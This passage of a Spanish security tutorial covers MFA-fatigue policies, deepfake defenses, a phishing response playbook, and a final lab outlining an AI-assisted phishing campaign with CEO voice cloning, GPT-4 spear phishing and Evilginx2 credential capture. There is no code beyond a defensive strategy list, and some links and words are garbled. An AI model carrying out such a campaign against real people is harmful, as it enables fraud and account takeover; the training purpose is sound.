- Feedback inmediato al usuario que falló
- Micro-entrenamiento de 2-3 minutos tras cada fallo

### 11.2 Políticas de MFA resistentes

**Recomendaciones:**
- Number matching en push notifications (obliga a ingresar número)
- rate : máximo 3 intentos de MFA por minuto
- Geolocation matching: solo aprobar MFA desde ubicaciones esperadas
- Passwordless MFA: usar FIDO2/WebAuthn en vez de push
- Condicional Access: bloquear logins desde ipss) no habituales
- Reportes de MFA fatigue: alertar cuando un usuario tiene +5 intentos

### 11.3 Detección de deepfakes

`python
# detect_deepfake_defense.py - Defensa contra deepfakes

class DeepfakeDefense: strategies = { "code_word": "Establecer una palabra clave que solo el verdadero CEO conoce", "callback": "Siempre devolver la llamada al número oficial, no al que llamó", "video_challenge": "Pedir que muevan la cabeza (los deepfakes tienen fallos en movimiento rápido)", "voice_challenge": "Preguntar algo que solo la persona real sabría", "timing_check": "Verificar que la llamada ocurre en horario laboral y día hábil" }
`

### 11.4 Respuesta a incidentes de phishing

**Playbook de respuesta:**
1. Reporte del usuario (click en link sospechoso)
2. Aislamiento del endpoint afectado
3. Revocación de sesiones y tokens
4. Cambio de contraseñas del usuario y relacionados
5. Búsqueda de IOC en logs ([ip](../raw/r3d3s-f0nd4m3nt0s.md#direccionamiento-ip) del atacante, user-agent, dominio)
6. Análisis [forense](../raw/w1n-f0r3ns1cs.md#forense) del email (headers, links, [payload](../raw/m3t4spl01t.md#payloads))
7. Reporte a CERT/CSIRT
8. Mejora de reglas de detección

## 12. Laboratorio Final Integrador

**Objetivo:** Ejecutar una campaña completa de [phishing](../raw/ph1sh1ng.md) con IA en un entorno controlado.

**Escenario:**
Simular un ataque APT-style contra una empresa ficticia. El objetivo es obtener acceso a la cuenta de un ejecutivo.

**Fases del laboratorio:**

1. **[osint](../raw/0s1nt.md) (2 horas)**: Recolectar información de 3 targets usando agentes IA
2. **Pretexting (1 hora)**: Generar pretexto convincente con contexto
3. **Deepfake (2 horas)**: Clonar voz del CEO y generar mensaje de [vishing](../raw/ph1sh1ng.md#vishing)
4. **s[pear phishing](./raw/ (2 horas)**: Generar emails personalizados con GPT-4
5. **Infraestructura (2 horas)**: Configurar Evilginx2 + dominio similar
6. **Ejecución (1 hora)**: Enviar campaña y monitorear
7. **Reporte (2 horas)**: Documentar hallazgos y recomendaciones

**Entregables:**
- Perfiles OSINT de los targets
- Emails generados (con variantes A/B)
- Audio de vishing con voz clonada
- Configuración de infraestructura
- Reporte de métricas (clics, credenciales, tiempo)
- Recomendaciones de mitigación

**Métricas de evaluación:**
- Tasa de clics (CTR)
- Tasa de captura de credenciales
- Tiempo medio hasta primer clic
- Efectividad del deepfake (evaluación ciega)
- Precisión del OSINT (datos correctos vs incorrectos)
- Coherencia del pretexto a lo largo de la campaña

---

> **Disclaimer:** Este tutorial es con fines educativos y de capacitación en seguridad informática. Todas las técnicas descritas deben ser utilizadas únicamente en entornos autorizados y como parte de pruebas de seguridad legítimas. El uso no autorizado de estas técnicas es ilegal.



